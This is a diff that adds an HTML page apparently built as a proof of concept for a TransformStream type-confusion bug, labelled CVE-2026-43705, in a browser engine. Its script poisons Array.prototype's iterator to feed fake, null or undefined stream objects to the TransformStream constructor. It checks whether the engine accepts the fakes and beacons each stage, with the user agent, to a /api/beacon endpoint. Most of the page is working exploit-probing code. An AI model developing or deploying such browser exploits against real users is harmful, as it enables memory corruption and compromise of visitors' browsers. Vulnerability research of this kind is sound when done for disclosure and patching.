@@ -1,0 +1,123 @@
+<!DOCTYPE html><html><head><meta charset="utf-8">
+<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
+<title>p800</title></head>
+<body><pre id="out">p800: CVE-2026-43705 TransformStream type confusion</pre>
+<script>
+'use strict';
+var O=document.getElementById('out');
+function say(s){O.textContent+='\n'+s;}
+function bk(tag,d){
+  var msg='P800-'+tag+(d!==undefined?'-'+String(d).slice(0,800):'');
+  say(msg);
+  try{
+    var x=new XMLHttpRequest();
+    x.open('POST','/api/beacon',false);
+    x.setRequestHeader('Content-Type','application/json');
+    x.send(JSON.stringify({stage:'p800',msg:msg,level:'info',sid:'p800-'+Date.now(),ua:navigator.userAgent}));
+  }catch(e){
+    try{new Image().src='/beacon?m='+encodeURIComponent(msg)+'&t='+Date.now();}catch(e2){}
+  }
+}
+
+bk('START', navigator.userAgent);
+
+// A: TransformStream availability
+bk('A-CHECK', typeof TransformStream);
+if(typeof TransformStream==='undefined'){
+  bk('DEAD','TransformStream absent');
+}else{
+  // B: Baseline
+  try{
+    var ts1=new TransformStream();
+    bk('B-BASELINE','readable='+(ts1.readable?'Y':'N')+' writable='+(ts1.writable?'Y':'N'));
+  }catch(e){
+    bk('B-ERR',e.message);
+  }
+
+  var origIter=Array.prototype[Symbol.iterator];
+
+  // C1: Return fake stream objects
+  bk('C1','poisoned iterator - fake objects');
+  try{
+    var fR={locked:false,cancel:function(){},getReader:function(){}};
+    var fW={locked:false,abort:function(){},getWriter:function(){}};
+    var triggered=false;
+    Array.prototype[Symbol.iterator]=function(){
+      triggered=true;
+      var items=[fR,fW,{}];var idx=0;
+      return{next:function(){
+        if(idx<items.length)return{value:items[idx++],done:false};
+        return{done:true};
+      }};
+    };
+    var ts2=new TransformStream();
+    bk('C1-SURVIVED','readable='+typeof ts2.readable+' eq='+(ts2.readable===fR)+' triggered='+triggered);
+    if(ts2.readable===fR) bk('C1-TYPECONF','*** FAKE ACCEPTED AS ReadableStream ***');
+  }catch(e){
+    bk('C1-THREW',e.name+':'+e.message);
+    if(e.name==='TypeError') bk('C1-PATCHED','null check present');
+  }finally{Array.prototype[Symbol.iterator]=origIter;}
+
+  // C2: Return nulls
+  bk('C2','poisoned iterator - nulls');
+  try{
+    Array.prototype[Symbol.iterator]=function(){
+      var items=[null,null,null];var idx=0;
+      return{next:function(){
+        if(idx<items.length)return{value:items[idx++],done:false};
+        return{done:true};
+      }};
+    };
+    var ts3=new TransformStream();
+    bk('C2-SURVIVED','readable='+ts3.readable);
+  }catch(e){
+    bk('C2-THREW',e.name+':'+e.message);
+  }finally{Array.prototype[Symbol.iterator]=origIter;}
+
+  // C3: Return real ReadableStream + fake WritableStream
+  bk('C3','real RS + fake WS');
+  try{
+    var realRS=new ReadableStream();
+    var fW2={locked:false};
+    Array.prototype[Symbol.iterator]=function(){
+      var items=[realRS,fW2,{}];var idx=0;
+      return{next:function(){
+        if(idx<items.length)return{value:items[idx++],done:false};
+        return{done:true};
+      }};
+    };
+    var ts4=new TransformStream();
+    bk('C3-SURVIVED','writable_eq='+(ts4.writable===fW2));
+    if(ts4.writable===fW2) bk('C3-TYPECONF','*** PARTIAL TYPE CONFUSION ***');
+  }catch(e){
+    bk('C3-THREW',e.name+':'+e.message);
+  }finally{Array.prototype[Symbol.iterator]=origIter;}
+
+  // C4: Return undefined items (tests jsDynamicCast on undefined)
+  bk('C4','undefined items');
+  try{
+    Array.prototype[Symbol.iterator]=function(){
+      var items=[undefined,undefined,undefined];var idx=0;
+      return{next:function(){
+        if(idx<items.length)return{value:items[idx++],done:false};
+        return{done:true};
+      }};
+    };
+    var ts5=new TransformStream();
+    bk('C4-SURVIVED','readable='+ts5.readable);
+  }catch(e){
+    bk('C4-THREW',e.name+':'+e.message);
+  }finally{Array.prototype[Symbol.iterator]=origIter;}
+
+  // D: Verify iterator restored
+  try{
+    var s=0;for(var v of[1,2,3])s+=v;
+    bk('D-VERIFY','sum='+s);
+  }catch(e){
+    bk('D-ERR',e.message);
+  }
+}
+
+bk('DONE');
+</script>
+</body></html>
